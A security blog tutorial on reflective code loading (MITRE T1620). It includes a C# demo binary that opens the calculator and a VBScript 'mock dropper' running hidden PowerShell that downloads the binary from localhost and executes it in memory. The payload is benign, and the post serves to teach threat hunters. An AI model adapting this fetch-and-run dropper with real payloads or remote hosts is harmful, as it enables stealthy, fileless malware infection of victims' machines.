# https://www.petergirnus.com/blog/what-is-reflective-code-loading-t1620

[0](https://www.petergirnus.com/cart)

# Exploring Defense Evasion through Reflective Code Loading (T1620)

[threat-hunting](https://www.petergirnus.com/blog/category/threat-hunting)[malware](https://www.petergirnus.com/blog/category/malware)[cybersecurity](https://www.petergirnus.com/blog/category/cybersecurity)

May 23

Written By [Peter Girnus](https://www.petergirnus.com/blog?author=60c1e77bb745f649b8369924)

![](https://images.squarespace-cdn.com/content/v1/60c543f3dd587909185f6a3f/d9f4e416-4438-41ec-81f0-75b36bd286e3/AdobeStock_335855451.jpeg)

# Introduction

* * *

[Reflective Code Loading](https://attack.mitre.org/techniques/T1620/), identified as T1620 within the [MITRE ATT&CK](https://attack.mitre.org/) matrix continues to be a prevalent defense evasion technique frequently encountered during routine threat hunting activities. It notably attains popularity in the context of loading .NET assemblies within the Windows operating system. This technique is often utilized by threat actors of varying skill sets to load numerous amounts of malicious software including, malware, ransomware, and exploits against known software vulnerabilities into the targeted systems memory space.

# Why Do Threat Actors Use Reflective Code Loading (T1620)?

* * *

Threat actors use Reflective Code Loading due to its evasion capabilities, memory persistence, obfuscation benefits, and flexibility for different scenarios, depending on the target. By leveraging reflective loading, malicious actors can enhance their ability to remain undetected, establish persistence, evade static analysis, and adapt malicious payloads to exploit various vulnerabilities effectively.

## Stealth

Reflective Code Loading is incredibly evasive due to the fact that it operates within the memory space of the targeted system. This allows threat actors to load malicious payloads and malware on targeted systems without leaving behind artifacts such as files on disk. This allows threat actors to evade traditional security solutions reliant on filesystem scanning and monitoring.

## Persistence

Threat Actors may leverage reflective code injection in order to maintain persistence on targeted systems. By injecting malicious payloads such as malware into legitimate system process or libraries threat actors can ensure that their malicious code can survive reboots or after the application of security measures.

## Defeating Static Analysis

In many real-world examples threat actors will deploy obfuscation and encryption to malicious payloads intended for reflective code loading to deter static analysis. With obfuscation and/or encryption the threat actors ensure that security researchers and analysts are unable determine malicious functionalities making it impossible to detect their malicious payloads with signatures. Often times threat actors will employ a combination or layer of obfuscation such as base64 encoding and encryption such as AES encryption to create a headache for threat researchers to analyze.

## Flexibility

A strong point of reflective loading is its ability utilize modern programming languages to dynamically load and execute a host of malicious payloads. This ensures considerable flexibility wherein a threat actor could develop various payloads specific to each target’s architecture or security solution. This flexibility allows threat actors to dynamically load malicious software depending on their target in order to increase the probability of a successful attack.

# Reflective Code Loading Tutorial: Unleashing the Power of Memory Execution

* * *

In order to get hands on to understand this technique I have prepared a concise tutorial to demonstrate the simplicity and efficacy of reflective code loading (T1620) through a series of straightforward steps:

1. Create a demo C# program

2. Compile the demo C# program

3. Use python HTTP server to host a compiled C# program to simulate an external web source

4. Create a mock dropper file in VBScript, emulating a dropper that utilizes PowerShell in order to download and execute our malicious binary in memory

5. Execution of the dropper to simulate an infection by means of code reflection


## Create a simple C\# Program

For the purpose of this demonstration, a minimalistic C# program will be utilized as the sample malicious binary to showcase the process of loading it through code reflection. The execution of this program will result in the instantiation of a basic calculator process. Visual Studio Code is the chosen development environment for this particular demonstration.

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://www.petergirnus.com/blog/what-is-reflective-code-loading-t1620)

|     |     |
| --- | --- |
|  | usingSystem; |
|  | usingSystem.Diagnostics; |
|  | classMaliciousProgram |
|  | { |
|  | staticvoidMain() |
|  | { |
|  | Process.Start("calc.exe"); |
|  | } |
|  | } |

[view raw](https://gist.github.com/gothburz/5d9a628f4a606ae66f48ffcc5e9acb47/raw/9448a88698acdde1eb10e63a71a5d73cb0b99f30/open-calculator.cs) [open-calculator.cs](https://gist.github.com/gothburz/5d9a628f4a606ae66f48ffcc5e9acb47#file-open-calculator-cs)
hosted with ❤ by [GitHub](https://github.com/)

Once the program has been written, it can be saved to a file named "malicious-binary.cs" for further reference and execution. Which we will compile in the next step

## Compile the Malicious Binary

To compile a ".cs" file, the command line arguments for the .NET framework projects utility binary "csc.exe" can be employed. If using PowerShell, this script can be located in the "Microsoft.NET\\Framework64<version>" directory, such as "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319". Following this, the command " **C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe .\\malicious-binary.cs**" can be executed. Upon a successful compilation, a file named "malicious-binary.exe" should be generated.

![PowerShell Compiling a C# File With csc.exe](https://images.squarespace-cdn.com/content/v1/60c543f3dd587909185f6a3f/e06d196a-df20-4687-94fe-382fcebf7751/PowerShell-csc-exe-compile.jpg)

Figure 1 - PowerShell Compiling a C# File With csc.exe

## Host the Malicious Binary on a Local Web Server

In this step, we aim to simulate the hosting of a malicious binary, which is a commonly employed technique by threat actors to reflectively load binaries into the memory space of the victim. To begin, we need to relocate our compiled executable to the desired hosting directory. Subsequently, we can utilize a utility such as Python's [SimpleHTTPServer](https://docs.python.org/3.8/library/http.server.html#http.server.SimpleHTTPRequestHandler) handler to facilitate the hosting process.

![This image shows how to run Python simple http server.](https://images.squarespace-cdn.com/content/v1/60c543f3dd587909185f6a3f/87800a6a-f84a-4454-aaf0-4b151d48609d/python-simple-http-server.jpg)

Figure 2 - Running Python's Simple HTTP Server

Important to know that you will need an administrator’s permission to run Python’s HTTP server over port 80.

## Creating our Mock VBS Dropper

In this particular step, we will develop a [VBScript](https://learn.microsoft.com/en-us/windows/win32/lwef/using-vbscript) that enables the execution of our binary through reflection. To accomplish this, we will [create a shell object](https://ss64.com/vb/shell.html) and utilize the Run method to execute PowerShell and .NET commands, which our PowerShell command will download and utilizing reflection load our malicious binary in memory.

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://www.petergirnus.com/blog/what-is-reflective-code-loading-t1620)

|     |     |
| --- | --- |
|  | ' This is for demo puroposes |
|  | CreateObject("WScript.Shell").Run("powershell -NoProfile -WindowStyle Hidden $assembly = \[System.Reflection.Assembly\]::Load((Invoke-WebRequest 'http://127.0.0.1/malicious-binary.exe' -UseBasicParsing).Content); $null = $assembly.GetTypes(); $method = $assembly.GetType('MaliciousProgram').GetMethod('Main', \[System.Reflection.BindingFlags\]'Static, Public, NonPublic'); $null = $method.Invoke($null, @())") |

[view raw](https://gist.github.com/gothburz/af16733e97cb603b5a1a859bb7e71d7c/raw/2b5e0b12ec044bf582aece9beaab82970076ecc4/dropper.vbs) [dropper.vbs](https://gist.github.com/gothburz/af16733e97cb603b5a1a859bb7e71d7c#file-dropper-vbs)
hosted with ❤ by [GitHub](https://github.com/)

Let’s take a closer look to understand what is going on with this PowerShell Command in detail so we can comprehensively understand the functionality and execution process.

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://www.petergirnus.com/blog/what-is-reflective-code-loading-t1620)

|     |     |
| --- | --- |
|  | $assembly= \[System.Reflection.Assembly\]::Load((Invoke-WebRequest'http://127.0.0.1/malicious-binary.exe'-UseBasicParsing).Content) |
|  | $null=$assembly.GetTypes() |
|  | $method=$assembly.GetType('MaliciousProgram').GetMethod('Main', \[System.Reflection.BindingFlags\]'Static, Public, NonPublic') |
|  | $null=$method.Invoke($null,@()) |

[view raw](https://gist.github.com/gothburz/dd76917bf2e54195d1a89be9a9c9408e/raw/f4254acc5d0f1125cb277fa6853269133a0ff375/reflection-assembly.ps1) [reflection-assembly.ps1](https://gist.github.com/gothburz/dd76917bf2e54195d1a89be9a9c9408e#file-reflection-assembly-ps1)
hosted with ❤ by [GitHub](https://github.com/)

In the above command we are the following actions in our PowerShell command:

**1.    $assembly = \[System.Reflection.Assembly\]::Load((Invoke-WebRequest 'http://127.0.0.1/malicious-binary.exe' -UseBasicParsing).Content)** This line downloads a binary file (malicious-binary.exe) from the specified URL (http://127.0.0.1/malicious-binary.exe) using [Invoke-WebRequest](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.3). We use the parameter -UseBasicParsing to ensure that the response is parsed without the need for a full web browser. The Content property of the downloaded file is then passed to [Load](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load?view=net-7.0#system-reflection-assembly-load(system-byte())) method of [System.Reflection.Assembly](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly?view=net-7.0), which loads the assembly into memory.

**2.    $null = $assembly.GetTypes()** This line retrieves an array of System.Type objects representing the types defined in the loaded assembly. By invoking the [GetTypes()](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.gettypes?view=net-7.0#system-reflection-assembly-gettypes) method on the $assembly object, we obtain the types present in the assembly.

**3.    $method = $assembly.GetType('MaliciousProgram').GetMethod('Main', \[System.Reflection.BindingFlags\]'Static, Public, NonPublic')** Here, we are obtaining a specific method called Main from a type named MaliciousProgram within the loaded assembly. We can see these important objects in our malicious-binary.cs source code. This line uses the GetType method on the $assembly object to retrieve the System.Type object representing the specified type. Then we call GetMethod the obtained type object, specifying the method name (Main) and the [binding flags](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.bindingflags?view=net-7.0) (Static, Public, NonPublic) to indicate that we want to find a static method named Main that can be accessed from any visibility level. The returned System.Reflection.MethodInfo object is assigned to the variable $method.

**4.    $null = $method.Invoke($null, @())** In this line, we invoke the Main method obtained in the previous step. The [Invoke](https://learn.microsoft.com/en-us/dotnet/api/system.windows.forms.control.invoke?view=windowsdesktop-7.0) method is called on the $method object, passing $null as the instance (since Main is a static method) and an empty array @() as the arguments to the method. This effectively triggers the execution of the Main method, causing it to run any code contained within from memory.

## Dropper to Execution

In order to simulate infection, we can simply run our VBScript file utilizing cscript.exe which will open up a hidden PowerShell prompt, download our malicious binary into memory, and then execute. Nice!

![This image shows the result of the code reflection to call calculator.exe from memory.](https://images.squarespace-cdn.com/content/v1/60c543f3dd587909185f6a3f/1a065585-a1d0-4aef-acdd-af2f14294409/assembly-reflection-to-calculator.jpg)

Figure 3 - Executable is Reflectively Loaded in Memory

We can also confirm in our Python HTTP server logs that our malicious binary was indeed retrieved.

![This image shows the Python HTTP server request logs](https://images.squarespace-cdn.com/content/v1/60c543f3dd587909185f6a3f/4438c00b-18df-477c-a5fd-85329dc18623/python-http-server-logs.jpg)

Figure 4 - Python HTTP Server Logs

# Conclusion

In conclusion we can see that reflective code loading (T1620) poses a significant threat by enabling evasion, persistence, code injection, dynamic functionality, and exploitation of trusted components. Threat actors of various levels of expertise may utilize this technique to dynamically load malicious software such as malware, ransomware, and software exploits into system memory directly. Furthermore this technique highlights the need for robust security measures and proactive defense strategies to detect and mitigate such attacks.

![linkedin sharing button](https://platform-cdn.sharethis.com/img/linkedin.svg)Share

![twitter sharing button](https://platform-cdn.sharethis.com/img/twitter.svg)Tweet

![facebook sharing button](https://platform-cdn.sharethis.com/img/facebook.svg)Share

![pinterest sharing button](https://platform-cdn.sharethis.com/img/pinterest.svg)Pin

![reddit sharing button](https://platform-cdn.sharethis.com/img/reddit.svg)Share

![sharethis sharing button](https://platform-cdn.sharethis.com/img/sharethis.svg)Share

[threat](https://www.petergirnus.com/blog/tag/threat)[threat-hunting](https://www.petergirnus.com/blog/tag/threat-hunting)[cybersecurity](https://www.petergirnus.com/blog/tag/cybersecurity)[malware](https://www.petergirnus.com/blog/tag/malware)

[Peter Girnus](https://www.petergirnus.com/blog?author=60c1e77bb745f649b8369924)

### Comments (0)

Newest FirstOldest FirstNewest FirstMost LikedLeast Liked

Preview
Post Comment…


[Previous\\
\\
Previous\\
**How To Use Windows Package Manager (WinGet) Tool**](https://www.petergirnus.com/blog/how-to-use-windows-package-manager-winget) [Next\\
\\
Next\\
\\
**How To Make HTTP/HTTPS Web Requests in Rust**](https://www.petergirnus.com/blog/how-to-make-http-requests-in-rust)

­

­